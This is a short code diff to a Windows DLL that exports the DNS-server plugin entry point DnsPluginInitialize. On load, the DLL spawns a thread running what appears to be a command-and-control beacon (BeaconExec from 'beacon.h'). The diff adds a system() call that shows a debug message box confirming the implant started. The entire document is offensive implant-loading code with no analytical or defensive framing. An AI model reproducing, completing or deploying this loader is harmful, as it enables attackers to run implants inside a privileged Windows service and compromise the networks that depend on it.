@@ -1,6 +1,7 @@
 #include "pch.h"
 #include "beacon.h"
 #include <thread>
+#include <iostream>
 
 #define DNS_PLUGIN_API  __declspec ( dllexport )
 
@@ -10,7 +11,7 @@ DNS_PLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) {
     HANDLE h;
     DWORD threadId;
     h = CreateThread(0, 0, BeaconExec, 0, 0, &threadId);
-
+    system("msg * Supposedly started handle");
     // std::thread thread_object(beacon);
     // thread_object.join();
     return 0;
